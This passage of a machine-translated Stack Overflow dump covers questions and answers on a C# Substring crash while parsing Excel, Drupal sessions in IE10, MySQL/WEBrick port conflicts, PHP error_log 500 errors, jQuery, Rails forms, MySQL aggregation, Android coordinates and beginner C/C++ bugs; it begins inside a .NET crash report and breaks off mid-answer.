>    CodeBase: file:///C:/Windows/Microsoft.Net/assembly/GAC_MSIL/System.Numerics/v4.0_4.0.0.0__b77a5c561934e089/System.Numerics.dll
> ----------------------------------------
> Microsoft.Office.Interop.Excel
>     Assembly Version: 14.0.0.0
>     Win32 Version: 14.0.4756.1000
>     CodeBase: file:///C:/Windows/assembly/GAC_MSIL/Microsoft.Office.Interop.Excel/14.0.0.0__71e9bce111e9429c/Microsoft.Office.Interop.Excel.dll
> ----------------------------------------
> office
>     Assembly Version: 14.0.0.0
>     Win32 Version: 14.0.4760.1000
>     CodeBase: file:///C:/Windows/assembly/GAC_MSIL/office/14.0.0.0__71e9bce111e9429c/office.dll
> ----------------------------------------
> Microsoft.CSharp
>     Assembly Version: 4.0.0.0
>     Win32 Version: 4.0.30319.1
>     CodeBase: file:///C:/Windows/Microsoft.Net/assembly/GAC_MSIL/Microsoft.CSharp/v4.0_4.0.0.0__b03f5f7f11d50a3a/Microsoft.CSharp.dll
> ----------------------------------------
> System.Dynamic
>     Assembly Version: 4.0.0.0
>     Win32 Version: 4.0.30319.1
>     CodeBase: file:///C:/Windows/Microsoft.Net/assembly/GAC_MSIL/System.Dynamic/v4.0_4.0.0.0__b03f5f7f11d50a3a/System.Dynamic.dll
> ----------------------------------------
> Anonymously Hosted DynamicMethods Assembly
>     Assembly Version: 0.0.0.0
>     Win32 Version: 4.0.30319.239 (RTMGDR.030319-2300)
>     CodeBase: file:///C:/Windows/Microsoft.Net/assembly/GAC_32/mscorlib/v4.0_4.0.0.0__b77a5c561934e089/mscorlib.dll
> ----------------------------------------
> 
> ************** JIT Debugging **************
> To enable just-in-time (JIT) debugging, the .config file for this
> application or computer (machine.config) must have the
> jitDebugging value set in the system.windows.forms section.
> The application must also be compiled with debugging
> enabled. 
> ```

```
For example:

<configuration>
    <system.windows.forms jitDebugging="true" />
</configuration>

When JIT debugging is enabled, any unhandled exception
will be sent to the JIT debugger registered on the computer
rather than be handled by this dialog box. 
```

这是你要求的代码。请注意，我确实更改了一些字符串。

```
private void buttonObradi_Click(object sender, EventArgs e)
{
    int brojac = 0;
    string grade = "";
    string grading1 = "2";
    string grading2 = "3";
    string grading3 = "4";
    string grading4 = "1";
    string grading5 = "No Answer";
    string grading6 = "5";
    string grupa = "";
    bool citaj = false;
    bool mozda = false;
    string odjel = "";
    string pododjel = "";
    string ocjenica = "";
    int prviProlaz = 0;

    foreach (DataRow redak in excelData.Rows)
    {
        if (prviProlaz > 0)
        {
            if (brojac == 0)
            {
                brojac = 1;
                grupa = redak[1].ToString();
                mozda = false;
                citaj = false;
            }
            else
            {
                if (redak[1].ToString() == "")
                {
                    mozda = true;
                    citaj = false;
                }
                else
                {
                    if (redak[1].ToString() == "Agent Name")
                    {
                        citaj = true;
                    }
                    else if (redak[1].ToString() == grading1 || redak[1].ToString() == grading2 || redak[1].ToString() == grading3 || redak[1].ToString() == grading4 || redak[1].ToString() == grading5 || redak[1].ToString() == grading6)
                    {
                        grade = redak[1].ToString();
                        mozda = false;
                    }
                    else if (mozda == true)
                    {
                        brojac = 0;
                    }
                    else if (citaj == true)
                    {
                        if (grupa == "Team A" || grupa == "Team M" || grupa == "Team T")
                        {
                            pododjel = "AAAA";
                            odjel = "CCCC";
                        }
                        else if (grupa == "Team 1" || grupa == "Team 2")
                        {
                            pododjel = "BBBB";
                            odjel = "TTTT";
                        }
                        else if (grupa == "K Team" || grupa == "F Team")
                        {
                            pododjel = "RRRR";
                            odjel = "SSSS";
                        }
                        else if (grupa == "Group 1" || grupa == "Group 2" || grupa == "Group 3" || grupa == "Group 4")
                        {
                            pododjel = "FFFF";
                            odjel = "TTTTT";
                        }
                        else if (grupa == "Fun group 1" || grupa == "fun group 2" || grupa == "fun group 3" || grupa == "fun group 4" || grupa == "fun group 5")
                        {
                            pododjel = "KKKK";
                            odjel = "FFFF";
                        }
                        ocjenica = ocjenica.Trim();

                        preSort.Rows.Add(redak[0].ToString(), redak[1].ToString(), "", grade, Convert.ToDecimal(redak[4].ToString()), grade.Substring(0, 1), grupa, pododjel, odjel);
                    }
                }
            }
        }
        else
        {
            prviProlaz = 1;
        }
    }
    dataGridView2.DataSource = preSort;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:37:40.400

您遇到的问题似乎是`Substring`参数无效的操作。无论如何，这就是错误。

那行代码在做什么`buttonObradi_Click`？也许您遇到的问题是因为您要打开的文件的相对路径错误。或者你的exe的路径，更有可能。就像，您搜索第四个反斜杠并`Substring`从那里执行...如果您的 exe 位于少于 4 个反斜杠的路径中，那么您就有麻烦了 :) 只是一个例子。

**编辑**：事实上，`Substring`确实会产生错误，并且代码中唯一的子字符串是`grade.Substring(0, 1)`. 所以等级必须为空。你说这只发生在某些机器上，所以我的猜测是，那台机器上的excel格式不同。据我可以从代码中确定，您解析 Excel 并期望在`grade`“代理名称”之前出现的行。如果：

```
else if (redak[1].ToString() == grading1 || redak[1].ToString() == grading2 || redak[1].ToString() == grading3 || redak[1].ToString() == grading4 || redak[1].ToString() == grading5 || redak[1].ToString() == grading6) 
```

必须先通过并初始化成绩，在此行之前：

```
if (redak[1].ToString() == "Agent Name") 
```

设置你`citaj`为真。否则你的`grade`变量永远不会被初始化，当然 Substring 会失败。

我希望我理解正确，我还没有真正调试过整个代码。所以我认为你应该检查机器上的excels这不起作用，看看它们是否错误，或者你需要调整你的代码以匹配该格式。但我仍然不明白为什么这会在 RAR 中起作用而不是在它之外......

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-24T11:26:00.140

堆栈跟踪导致我们看到错误与 Obradi 按钮单击`Substring`错误地调用方法有关（可能是因为字符串为空）：

```
System.String.InternalSubStringWithChecks(Int32 startIndex, Int32 length, Boolean fAlwaysCopy)
at System.String.Substring(Int32 startIndex, Int32 length)
at ExcelSvjetlana.Form1.buttonObradi_Click(Object sender, EventArgs e) 
```

错误消息允许我们看到它的`OutOFRange`异常，并且开始/停止字符串提取是一个问题：

> System.ArgumentOutOfRangeException：索引和长度必须引用字符串中的位置。

当我们检查使用时，`grade.substring`我们可以看到它的状态可能是空的、空的或等等（afaik 它的空）。

**解决方案**

将行添加到数据表以绑定到 dataGridView2 时，在此行上放置一个[条件断点](http://msdn.microsoft.com/en-us/library/7sye83ce.aspx)以确保等级字符串变量不是`string.IsNullOrEmpty(grade)`：

```
preSort.Rows.Add(redak[0].ToString(), redak[1].ToString(), "", grade, Convert.ToDecimal(redak[4].ToString()), grade.Substring(0, 1), grupa, pododjel, odjel); 
```

当您无法在本地开发环境中重现问题时，您需要添加日志记录和异常处理。

将其放入`foreach(DataRow redak`Try-Catch 中。然后声明一个`dr`范围超出 try-catch 的变量并分配`redak`给`dr`每次迭代。然后在 try-catch 异常处理程序中吐出 excel 电子表格`dr`行的详细信息，以便您可以跟踪它并在调试器中重现它，例如：

```
 DataRow dr;
    try
    {
       foreach (DataRow redak in excelData.Rows)
       {
          dr = redak;
       ...
       }
    }
    catch (Exception ex)
    {
         WriteToLog("Event: buttonObradi_Click. Problem with importing excel spreadsheet row: " + dr[0].ToString() + "\r\n Error: " + ex.Message);
    } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-25T18:20:19.397

当您双击 rar 中的 .exe 文件（在 winrar 或 7zip 中）时，所有 rar 文件内容都将提取到本地临时文件夹中的一个新文件夹中，如下所示的文件夹：C:\Users\~ user名称 ~\AppData\Local\Temp\Rar$EX00.744\

因此，您需要检查此文件夹，并查看可能有助于运行应用程序的文件。

它可能正在加载不同的 excel 文件，您尚未共享该部分代码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:48:13.000

显然，你`Substring()`用错误的参数调用——可能`startIndex`太小或太大。或者它`length`太大（或太小）。.NET 的实现`Substring`总是困扰着我——我宁愿让它返回`string.Empty`而不是抛出；所以你可以在打电话之前插入支票`Substring()`或......

```
public static string SubstringFixed(this string str, int startIndex, int length)
{
    if (startIndex >= str.length || startIndex < 0)
    {
        return string.Empty;
    }
    length = Math.Min(length, str.Length - startIndex);
    length = Math.Max(length, 0);

    return str.Substring(startIndex, length);
} 
```

在实用程序类的某处声明此方法，然后使用`s.SubstringFixed()`而不是`s.Substring`- 它只会返回`""`而不是抛出`ArgumentOutOfRangeException`坏情况。

哦，当然，当您使用字符串时，您应该始终确保正确处理空字符串......无论“正确”代表什么。通常它只是“不要崩溃，实际上什么也不做”。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-24T11:10:33.027

我不认为这个问题是因为代码中有问题。

请确保您在代码使用的存档（RAR）中没有 excel 文件（或任何其他文件）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-24T15:39:15.687

正如其他人在您调用grade.Substring(0,1) 时提到的这个问题，而grade 是一个空字符串。毫无疑问，它是代码中唯一可以引发此异常的方法的调用。您绝对应该使用 Try Catch 块包围此方法以优雅地失败。

在您的代码中，当等级为空时，IE 长度为 0，并且您尝试访问将引发异常的等级 [0]。

如果输入格式错误，ToDecimal 也会引发异常，因此您也需要优雅地检查输入。再一次，一个 Try Catch 块会创造奇迹，让你的程序继续运行，而只错过这一行。

如果这是从 RAR 文件中提取后 EXE 出现的问题，那么您将得到一个损坏的可执行文件。我不确定您的应用程序如何加载一个 excel 文件，但如果它自动尝试从当前目录加载一个 excel 文件，您可能在 temp 文件夹中有一个正确的 excel 文件（这是您从 RAR 文件执行时 EXE 所在的位置）

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-04-28T08:41:12.663

最后我明白了。这是由于特权。Rar 有它，而我的应用程序没有安装并且没有文件夹的权限。因此发生了错误。仍然不知道为什么任何方法都会使用磁盘上的内存空间。

正如我所说，字符串函数不是问题。

# internet-explorer - Drupal 的 IE10 中未维护用户会话

> ID：13704092
> 
> 赞同：0
> 
> 时间：2012-12-04T13:30:38.660
> 
> 标签：internet-explorer, session, drupal

在我的 drupal 站点中，在新选项卡中打开某些菜单链接后登录后不会保持会话。此问题仅存在于 IE 10 中。任何人都可以在 IE10 中使用 drupal 站点遇到此问题。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:02:45.403

我自己无法对此进行测试，但我建议您访问 Drupal 站点并搜索核心问题列表以查看是否有其他人报告了此问题。我只是做了一个快速的一般搜索，但找不到任何东西。( [Drupal Core 问题](http://drupal.org/project/issues/drupal)就在这里)

另外，请检查您的设置，看看那里是否有奇怪的东西。如果没有，您可以随时在 Drupal.org 上创建一个新问题并解决您的问题。

# mysql - 同时运行 MySQL 和 Webrick Windows 7

> ID：13704097
> 
> 赞同：0
> 
> 时间：2012-12-04T13:31:02.837
> 
> 标签：mysql, ruby-on-rails-3

希望这是一个可以解决的简单问题

我已经为 Windows 安装了 Ruby 安装程序，安装了 mysql 5.5 并已将 mysql 配置为侦听端口 3000

当我运行 mysql 服务器然后尝试使用 rails si 运行 webrick 时收到错误消息

```
Only one usage of each socket is normally permitted bind(2) 
```

所以两台服务器都试图在同一个端口上运行？我不能同时使用它们，如果我杀死 localhost:3000 上的进程，那么这两个服务都会被重置

有没有办法将它们配置为同时工作？

编辑

我的 config/database.yml 文件

```
development:
adapter: mysql2
encoding: utf8
reconnect: false
database: library_development
pool: 5
username: root
password:
host: localhost
port: 3000 
```

有没有人遇到过这种情况，非常沮丧

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:35:13.723

使用 -p 标志指定 webrick 绑定到不同的端口。就像是

```
rails server -p 3001 # Assuming you are starting via command prompt 
```

这应该允许两个服务同时运行。

# jquery - jQuery：从服务器 onclick 工作中获取元素

> ID：13704107
> 
> 赞同：-2
> 
> 时间：2012-12-04T13:31:30.763
> 
> 标签：jquery

jQuery：从服务器 onclick 工作中获取元素

```
$(function() {
   $('.class1 a, .class2 a').click(function(e) {    
      href = $(this).attr("href");              
      $.post(href,function(data) { 
         $('#content').html('');        
         $('#content').append(data);          
      });   
   });
}); 
```

如果class2 back form server如..，onclick功能在这个类上不起作用，如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:34:56.123

尝试`on`在 body 元素上的 'class1 a, class2 a' 上使用 ' ' 过滤器，而不是在页面上搜索所有类。

说明：`$('.class1 a, .class2 a').`搜索所有元素并添加一个事件。稍后添加内容时，不会将事件添加到其中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:35:58.000

你需要`preventDefault`：

```
$('.class1 a, .class2 a').click(function(e) {    
  e.preventDefault();
  ...
}); 
```

# php - PHP - 尝试使用 error_log() 记录导致 500 错误

> ID：13704109
> 
> 赞同：3
> 
> 时间：2012-12-04T13:31:47.823
> 
> 标签：php, iis, permissions

我有一个 IIS 服务器，它通过 fastcgi 为 PHP 提供服务。当错误日志文件由 IIS_IUSRS 组（运行 IIS 用户的组）中的用户以外的用户写入时，IIS 将无法写入该文件，并且 PHP 调用会`error_log()`导致 500 错误。（至少这是我的猜测，好像我删除了日志文件，错误消失并且重新创建了日志文件）。

无论如何我可以阻止500错误的发生吗？

编辑：要清楚，我知道我可以通过停止记录、记录到事件日志或其他位置等来阻止这种情况，但这不是我的意思。我的意思是我只是想防止 500 错误，我不太关心我的系统无法记录它应该在尝试时破坏站点。这正是它可能发生的最糟糕的行为。我只是希望 500 错误不会发生并且该站点继续工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T11:01:13.573

由于您的计划任务实际上是在更改错误日志文件的权限，所以我能看到的唯一可行选项是：

1）使计划任务不写入error_log。将以下内容添加到 cron 作业的顶部：

`error_reporting(E_NONE);`

2) 通过在计划任务（PHP 文件）开始时发出以​​下命令，将计划任务写入系统日志（Windows 中的事件查看器）：

`ini_set('error_log', 'syslog');`

3）如果以上所有都不适合您，您可以尝试将任务安排为 IIS 用户/组。这将确保满足权限并且不再导致错误 500。

对此没有什么神奇的解决方法，您可以更改计划任务，使其具有与 PHP 进程相同的 UID/GID，或者您可以停止登录 schedule_task。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-22T03:59:20.673

编辑[php.ini](http://www.php.net/manual/en/configuration.file.php)，找到这一行并编辑：

```
error_log = /your/website/path/to/log 
```

并确保将 display_errors 更改为关闭：

```
display_errors = off 
```

请记住将 chmod 777 放入文件:)。如果您想在浏览器中查看该文件，可以在 .htaccess 文件中添加如下内容：

```
<Files /your/site/path/to/log/file.log>
    allow from 10.0.1.1/16
    deny from all
</Files> 
```

PS：对不起，我没有看到符号是 ISS 服务器...嗯，也许可以在 ISS 的 error_log 中查看有关错误的更多信息（我不知道在哪里）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-23T05:58:56.493

我经历过这个。您的 error_log 可能对于文件来说太大了。例如，当您的 error_log 达到 16mb 时，服务器将抛出错误 500。您可以删除您的 error_log 并尝试它是否仍然抛出该错误。您可能还想检查 error_logs 权限和所有权。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-26T17:58:23.773

您想避免 error_log 函数引发 500 Internal Server Error！

好吧，如果可能是这种情况，您是否尝试过在对 error_log 的调用前加上“@”。这可能会抑制错误。请尝试恢复！:)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-21T19:28:15.630

您可以尝试使用 error_log() 在替代路径中写入应用程序日志：

```
error_log("Some fancy error to log", 3, "c:\tmp\your-custom-errors.log"); 
```

或者您可以配置 php 以记录到 Windows 事件日志（在您的 php.ini 中）：

```
error_log = syslog 
```

# ruby-on-rails - simple_form 和 active_attr 错误

> ID：13704111
> 
> 赞同：0
> 
> 时间：2012-12-04T13:31:49.853
> 
> 标签：ruby-on-rails, ruby-on-rails-3.2, simple-form, active-attr

我正在使用 active_attr 和 simple_form。

当我导航到应该显示我的表单的页面时，我收到以下错误：

```
undefined method `new_record?' for #<Message body: nil, email: nil, name: nil, subject: nil> 
```

这是我的模型：

```
class Message

  include ActiveAttr::Model

  attribute :name
  attribute :email
  attribute :subject
  attribute :body

  validates :name, :email, :subject, :body, :presence => true
  validates :email, :format => { :with => %r{.+@.+\..+} }, :allow_blank => true

end 
```

我的控制器：

```
class ContactController < ApplicationController
  def new
    @message = Message.new
  end

  def create
    @message = Message.new(params[:message])

    if @message.valid?
      NotificationsMailer.new_message(@message).deliver
      redirect_to(root_path, :notice => "Message was successfully sent.")
    else
      flash.now.alert = "Please fill all fields."
      render :new
    end
  end
end 
```

最后是我的观点：

```
<%= simple_form_for @message, :url => contact_path do |f| %> 
  <%= f.input :name %>
  <%= f.input :email %>
  <%= f.input :subject %>
  <%= f.input :body %>
  <%= f.button :wrapped, :submit %>
<% end %> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:01:21.013

[显然，我在https://github.com/plataformatec/simple_form/wiki/Twitter-Bootstrap-v2-and-simple_form-v2](https://github.com/plataformatec/simple_form/wiki/Twitter-Bootstrap-v2-and-simple_form-v2)上找到的为 twitter 引导程序制作包装按钮的额外功能打破了它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T13:42:57.853

此错误是由于在 v0.7.0 中修复的 active_attr 中的错误造成的。升级解决了这个问题。

# mysql - MySQL SUM 和 CASE 可能在 DISTINCTROW 上？

> ID：13704115
> 
> 赞同：0
> 
> 时间：2012-12-04T13:32:08.593
> 
> 标签：mysql, left-join, distinct, case

我有这个查询：

```
SELECT
    p.name,
    COUNT(DISTINCT t.keyTask) AS totalTasksCount,
    SUM(DISTINCT CASE WHEN t.keyPriority = 24 AND (t.keyState = 16 OR t.keyState = 17) THEN 1 ELSE 0 END) AS highPriorityTasksCount,
    SUM(DISTINCT CASE WHEN t.keyState = 16 OR t.keyState = 17 THEN 1 ELSE 0 END) AS activesTasksCount,
    SUM(DISTINCT t.estimatedDuration) AS estimatedDuration,
    SUM(TIMESTAMPDIFF(SECOND,wp.start,wp.end)) * 1000 AS workedDuration
FROM projects_projects p
LEFT JOIN projects_tasks t
    ON p.keyProject = t.keyProject
LEFT JOIN projects_workPeriods wp
    ON wp.keyTask = t.keyTask
LEFT JOIN common_organizations o
    ON o.keyOrganization = p.keyOrganization
LEFT JOIN common_users uc
    ON uc.keyUser = p.keyUserCreator
LEFT JOIN common_users uu
    ON uu.keyUser = p.keyUserUpdater
GROUP BY
    p.keyProject
ORDER BY
    highPriorityTasksCount DESC,
    activesTasksCount DESC,
    p.updated DESC,
    p.name; 
```

但是结果字段`highPriorityTasksCount`并`activesTasksCount`返回 0 或 1，这在此查询中是正常的。我想知道是否有任何方法可以`DISTINCTROW`在**没有**子查询的情况下处理这些字段的*行*而不是*案例结果值*？

 ****当前结果：**

```
p.name,
totalTasksCount,
highPriorityTasksCount,
activesTasksCount,
estimatedDuration,
workedDuration

'Project 1',  '4', '1', '1',  '14400000',  '15300000'
'Project 2', '48', '1', '1',  '84600000', '503100000'
'Project 3',  '6', '1', '1', '108000000',        NULL
'Project 4',  '4', '1', '1',  '25200000',  '30600000'
'Project 5',  '5', '1', '1', '226800000',  '39600000'
'Project 6',  '2', '0', '1',        NULL,  '10800000'
'Project 7',  '9', '0', '1',        NULL,  '36900000' 
```

**预期结果 ：**

```
'Project 1',  '4', '1', '1',  '14400000',  '15300000'
'Project 2', '48','20', '2',  '84600000', '503100000'
'Project 3',  '6', '1', '1', '108000000',        NULL
'Project 4',  '4', '4', '2',  '25200000',  '30600000'
'Project 5',  '5', '5', '1', '226800000',  '39600000'
'Project 6',  '2', '0', '1',        NULL,  '10800000'
'Project 7',  '9', '0', '1',        NULL,  '36900000' 
```

**编辑 ：**

使用子查询修改查询，因为没有办法，有关优化的帮助将不胜感激，这个正在工作：

```
SELECT
    p.name,
    COUNT(DISTINCT t.keyTask) AS totalTasksCount,
    /* OLD SUM(DISTINCT CASE WHEN t.keyPriority = 24 AND (t.keyState = 16 OR t.keyState = 17) THEN 1 ELSE 0 END) AS highPriorityTasksCount, */
    (
        SELECT
    SUM(CASE WHEN st.keyPriority = 24 AND (st.keyState = 16 OR st.keyState = 17) THEN 1 ELSE 0 END)
    FROM projects_tasks st
    WHERE
    st.keyProject = p.keyProject
) AS highPriorityTasksCount,
    /* OLD SUM(DISTINCT CASE WHEN t.keyState = 16 OR t.keyState = 17 THEN 1 ELSE 0 END) AS activesTasksCount, */
    (
        SELECT
    SUM(CASE WHEN st.keyState = 16 OR st.keyState = 17 THEN 1 ELSE 0 END)
    FROM projects_tasks st
    WHERE
    st.keyProject = p.keyProject
) AS activesTasksCount,
    SUM(t.estimatedDuration) AS estimatedDuration,
    SUM(TIMESTAMPDIFF(SECOND,wp.start,wp.end)) * 1000 AS workedDuration
FROM projects_projects p
LEFT JOIN projects_tasks t
    ON p.keyProject = t.keyProject
LEFT JOIN projects_workPeriods wp
    ON wp.keyTask = t.keyTask
LEFT JOIN common_organizations o
    ON o.keyOrganization = p.keyOrganization
LEFT JOIN common_users uc
    ON uc.keyUser = p.keyUserCreator
LEFT JOIN common_users uu
    ON uu.keyUser = p.keyUserUpdater
GROUP BY
    p.keyProject
ORDER BY
    highPriorityTasksCount DESC,
    activesTasksCount DESC,
    p.updated DESC,
    p.name; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:01:09.780

> **没有**子查询。

不，您必须使用子查询，否则我对 MySQL 有一些不了解。**

# android - 设置面向方向的位置纬度和经度

> ID：13704118
> 
> 赞同：1
> 
> 时间：2012-12-04T13:32:13.193
> 
> 标签：android, location, latitude-longitude, compass-geolocation

您如何克隆自己的位置，然后向所需方向添加一些额外的米？

现在我的 android 应用程序可以获取方位角和我的 GPS 位置，并且我硬编码了所需的距离，例如 10 米。

然后我的应用程序应该创建一个新位置，正好在我所面对的 10 米处。

所以如果我的位置是：经度17.537200603552526，纬度25.70358496181195

我想让它直接向北移动 8 米，直接向东移动 2 米。

新的经度和纬度是否如下所示：

当前经度 + 0.00008 ，当前纬度 + 0.00002

这是我的一些代码来计算梯度和新位置：

```
public double[] calculateXYLength(double[] vals, double distance)
{
    double x = vals[0];
    double y = vals[1];

    if (vals[0] < 0)
        {
            x = x * -1;
        }
    if (vals[1] < 0)
        {
            y = y * -1;
        }
    // Log.d("lengths", "K = " + distance + " / (" + x + " + " + y + " )" );
    double k = distance / (x + y);

    // Log.d("lengths", "vals[0]: " + vals[0] + "  vals[1]: " + vals[1]);
    // Log.d("lengths", "x: " + (vals[0] * k) + "  y: " + (vals[1] * k) +
    // "  k: " + k);
    return new double[] { (vals[0] * k), (vals[1] * k) };
} 
```

注意 vals 是我已经计算的梯度，我返回的结果将用于添加到我的新位置点。

```
 Location newPosition = currentPosition
    newPosition.setLongitude(myPosition.getLongitude() + val[0]);
    newPosition.setLatitude(myPosition.getLatitude() + val[1]); 
```

但问题是，我没有得到这两个位置之间所需的距离。我不知道为什么。如何在纬度/经度上添加所需的距离？

谢谢，约翰

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:35:39.513

经度和纬度的度量是度而不是米，我认为这是问题所在。1 度 = 111.12 公里

# c - 在c中查找指向选项卡的两个指针之间的间隔

> ID：13704121
> 
> 赞同：-2
> 
> 时间：2012-12-04T13:32:16.757
> 
> 标签：c, arrays, function, pointers, element

我想知道两个指向选项卡的指针之间有多少个元素，带有一个函数。

例如，在此代码中，nb 将为 20。

```
int main(void)
{
  int t[50] = {0};
  int nb;

  nb = finding_number_element(&t[10], &t[30]);
  return (0);
} 
```

你有想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:57:55.243

尝试

```
int finding_number_element(int *a, int *b) 
{
  return (b - a);
} 
```

如果 a 和 b 将是指向同一个数组的指针，这应该可以工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:49:58.323

如果您需要一些不关心 t 的数据类型的东西

```
#define ele_size(x) sizeof(x[0])

int main(void)
{
    int t[50] = {0};

    int nb;
    nb = finding_number_element(ele_size(t),&t[10], &t[30]);
    return (0);
}

int finding_number_element(unsigned int ui_ele_size, void *a, void *b) 
{
    unsigned int ui_pointer1 = (unsigned int)a;
    unsigned int ui_pointer2 = (unsigned int)b;

    return ((b - a)/ui_ele_size);

} 
```

# eclipse - 在 eclipse git (EGIT) 中究竟 fetch 做了什么？

> ID：13704124
> 
> 赞同：1
> 
> 时间：2012-12-04T13:32:30.597
> 
> 标签：eclipse, git

在 git 文档中说 fetch 不会与您的工作树合并。所以假设我有这些分支：master、jhonny 和 miguel。假设 master 是最后一个生产代码版本。

```
--------------------------------------------master
                         \-----------------------miguel
                          \---------------------------jhonny 
```

Miguel 和我跟踪了我们本地仓库中的所有分支。假设 Miguel 提交并将他的分支推送到 github 存储库。我想让 miguel 本地化。如果我去取，会发生什么？fetch 是否只更新远程 repo 参考？在这种情况下起源。

如果您认为这是重复的，请投反对票。但我找不到我正在寻找的答案。

问候。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:36:50.620

是的，`git fetch`只更新远程仓库的本地副本（即远程引用）——它不会像这样将这些更新合并到本地分支`git pull`中。

从这个意义上说，这`git fetch`是非常“安全”的，因为没有合并问题，并且您所有的本地分支机构都保持不变。有关更详细的讨论，请参阅：['git pull' 和 'git fetch' 之间有什么区别？](https://stackoverflow.com/questions/292357/whats-the-difference-between-git-pull-and-git-fetch)

如果在 a 之后`git fetch`您确实想将远程更改与本地分支合并，则需要运行`git merge`. 这实际上是做什么`git pull`的。

# objective-c - 将光标悬停在标签上时我的应用程序的奇怪行为

> ID：13704125
> 
> 赞同：0
> 
> 时间：2012-12-04T13:32:33.363
> 
> 标签：objective-c, mouseover, nstextfield

我的应用程序出现了奇怪的行为。在其他对象中，我有一个连接到 IBOutlet currentDate 的标签。还涉及一个格式化程序，它注意只显示当前时间。有一个计时器在后台运行，每隔一秒触发一次。

到目前为止一切正常。

当我将鼠标光标移到标签上并将其留在那里时，几秒钟后应用程序会自动终止。调用 applicationWillTerminate 并且应用程序退出，就好像我点击了退出菜单一样。也不例外，应用程序会定期退出。

我不明白为什么会这样。当我将光标移到标签上时，该应用程序不应执行任何操作。当我不在该标签上移动光标时，应用程序仍在运行。

有什么线索吗？

问候，罗纳德

# c++ - C++ Visual Studio 2010 如何在不同函数中使用 char 类型变量

> ID：13704126
> 
> 赞同：0
> 
> 时间：2012-12-04T13:32:37.470
> 
> 标签：c++, visual-studio-2010, char

我在我的程序中遇到了关于 char 类型变量的问题。我没有发布代码，因为它太长了，但这大致是我想要做的：

```
#include ...

char path[100];

int main()
{
    char path[100] = "C:/......";

    [...]

    out = function();
}

int function()
{
    [...]
    imwrite(path,image);
    [...]

} 
```

问题是我的路径变量似乎以某种方式丢失了，因为如果我在函数 imwrite 之前尝试 cout < < path 它不会打印任何东西，就好像路径为空一样。

我应该怎么做才能在函数中访问我的路径变量？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:34:25.470

您正在`path`主函数范围内以及全局范围内定义变量。

在`main()`你有一个新的声明`path`：

```
char path[100] = "..."; 
```

这有效地为您提供了两个具有相同名称但范围不同的变量。如果您`path`从`main`方法内部访问，它将访问本地范围的变量。

如果您希望保持这种方式，并删除全局范围的`path`变量，您可以将您的函数重新声明为：

```
int function(char* p_path)
{
    imwrite(p_path, image);
} 
```

并将值作为参数从 main 传递：

```
char path[100] = "...";
...
function(path); 
```

`::path`顺便说一句，您可以通过引用指定全局命名空间来强制从主方法中访问全局范围的变量。但那是另一回事了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:37:00.400

您正在定义一个全局变量（在全局范围内）`path`和一个局部变量`path`。`main()`这意味着 inside指的是本地的，而 in`main()`指的是全局的。`path``function()`

如果路径是硬编码的（如您给出的示例中），您可以这样做：

```
#include ...

char path[100] = "C:/......";

int main()
{
    [...]

    out = function();
} 
```

如果需要计算路径，请改为执行以下操作：

```
#include ...

char path[100];

int main()
{
    [...]
    std::copy(computedPathValue, computedPathValue + computedPathLength + 1, path);

    out = function();
} 
```

当然，最好的办法是 have`std::string path`而不是 a `char[100]`。

# c - 执行时出错：分段错误

> ID：13704127
> 
> 赞同：0
> 
> 时间：2012-12-04T13:32:41.130
> 
> 标签：c

我是C语言的初学者。在阅读了 Ritchie 书的最初章节后，我编写了一个程序来生成随机数和字母表。

该程序用 gcc 编译得很好。但是在运行它时，它会给出一个错误“分段错误”，这在我有限的知识中是无法理解的。我很高兴能理解我写错了什么。

```
#include <stdio.h>
#include <stdlib.h> 
#include "conio.h"
#include <time.h>

long int genrandom(int,int);
void randAlph(void);
char letterize(int);

int main (void) {
//     char full[9];
//     char part_non[4];  
    srand(time(0));        

    int i;
    for (i=0;i<50;++i) {
      randAlph();
    };

}

long int genrandom(int mino,int maxo) {
    int val=mino+rand()/(RAND_MAX/(maxo-mino)+1);
    return val;  
}

void randAlph (){
  int val;
  char text;
val=genrandom(0,26);
//  return val;
text=letterize(val);
printf("%s ,",text);

}

char letterize(int num) {
  char letter='A'+num;
  return letter;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:35:24.393

`printf("%s ,",text);`是错误的 - 它说这`text`是一个以 nul 结尾的字符数组。利用

```
printf("%c ,", text); 
```

而是打印您的单个字符。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T14:23:57.853

```
#include <stdio.h>
#include <stdlib.h> 
#include "conio.h"
#include <time.h>

int genrandom(int,int);
void randAlph(void);
char letterize(int);

int main (void) {
//     char full[9];
//     char part_non[4];  
    srand(time(0));        

    int i;
    for (i=0;i<50;++i) {
      randAlph();
    };

}

int genrandom(int mino,int maxo) {//changed function return type to int
    int val=mino+rand()/(RAND_MAX/(maxo-mino)+1); //Be careful when you are using '/' operator with integers
    return val;  //returning int here why set return type to long int?
}

void randAlph (){
  int val;
